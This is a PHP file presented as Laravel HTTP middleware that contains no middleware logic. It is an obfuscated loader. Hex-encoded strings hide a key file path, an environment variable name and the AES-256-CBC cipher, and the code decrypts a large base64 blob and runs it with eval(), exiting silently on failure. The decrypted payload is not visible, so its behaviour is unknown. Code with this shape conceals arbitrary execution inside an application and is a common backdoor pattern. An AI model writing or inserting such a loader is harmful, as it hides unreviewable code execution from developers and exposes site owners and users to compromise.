<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zIUM37OVfg+Msr/UFY/YLQ==');

$c=base64_decode(

'TBK1xgZWnBtrrPfTcOQzB7i9+QH9q+8XEiHanHCkfhchZmWRRNz65kuvs7dTaaN2aNqU3//4eobp' .
'adgwlU1DBc9pyrs218R25NEtZBQNaG8VZr9wHkcrKmL+73L2tmfuYLVz9dOwxRYQuTyzShPg6l30' .
'OohULsIhgCAkpRRzBR2MD81vPru/oSoykcXixqGwalWintmGJmtPf9WSPhN5MD622+YVqDLhdLmd' .
'V1amJdhlXsrglUC1Nli55dlESWghLnY9QuUVcSKwD6JnSpMGUCZOK2D45HDlYh9Fbfn/tXTQcOHU' .
'syU5lRNhmyzdp0/PQAS3Gfrxosfrq4igsRO0Car5F8CHvpTIW5PLJKwGWaqR96sH8YQ9RZS+InbX' .
'oCZuyhdsYROtuNGGsdhsctUQJkHJQmaa/+AtAeqBHVONyoZf0A1Nfa8Q+8XmB1DgG+uMnWnHomtV' .
'WQCleikJNiAR2rx/ITTzVon6FitBYY9ID8SfvFQKgA9XS+MamEObjUV4aBB/fgg9S3eS54Y8Tg5p' .
'hbFcZwTjmOn8vLbNCrlMkkAxZQUNcBhlr0EiKrFTl2tjbkCaYmlZC8rmAdSr5p507oyqDmqotOKQ' .
'REn4mg2Tw4bTRCFPaPD0Ja6VO0s3j1QcLP+7OvSyhlbGHsqM0cZMWVEJLuoOsMaWC4F277oEqz+Q' .
'XPDgJEhsNqQ5uz+fY7iQR/jS7FGhLcbGnZ3XK5jAQKTXxrMXNXxoECZPj7O6LavLbSGW8liH5H3E' .
'JtPvBySV/LmgoRHFMQsUVcv24aqOuWiscDk9xBAg8T1Z+l0MlJaLc/v+ctsDc+djzSZmMqRI2ds5' .
'Zuof+3QZC0Vg8v6wZ1gFmrx3n8RxKpVxoj+QwnFh5xoqmJo9C1MC9q3CTclSzRx7Cm3lPQesRxKl' .
'eQOGN5us3rSBLSgjjCsRvZV7Ukx6Ei08qSQrQXxzEYl4RpO9RGSQuZNsEQBuJCMuRqj/HtJPg9M1' .
'9l8KkgNuMu4bh9aKweHlhYTwanHX9YdwkSXShfiGtDHLQEi5pCvoO2a3iDM+YQqbhqZsz/wn7K+E' .
'3/SZZxSf4zZb5gX1lNy4YnEY42p6rxQTCcMOg60rs9htUgDspVg3Pn5lGq+/R4E+tsh4dZFvTiil' .
'OiHvWRxrtMO7+6Y5SLAbraqC7WTIVC2mpfaJgP9YUHBgH7REhOVmEPBbiE4a1JNE+rWclgEK6efM' .
'GrMypY0CWquKi2kFlF6mfdBgSJFihl17GaAFmEV79tWzTBi55v4v+evCgrRJH1AJzmMdNOyHxGgL' .
'g/k5I9z+BJxOxHPAaV5O9QWmKGCQad0d0DbOnsjf9tCOjN0kcCO4/WG0eVx5bNGm9umOkY5igKPY' .
'kxkK+9BSQ64XqEOhpgrz3+OdncICH+f0wZDeqwgon3W/6c1NECgG/M6bn1POkv5lnmkJTn/aGig8' .
'xkskFiuTtjNInFZFaPXQcompt/8QsYXPKp7+bP6tIRThTl5gqwGvHjnM+PbmTc05kUbUG5BAqEDm' .
'35pAc0CbDI3Gs/8l7wMTn4RWy6qHgm9UpI7whQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

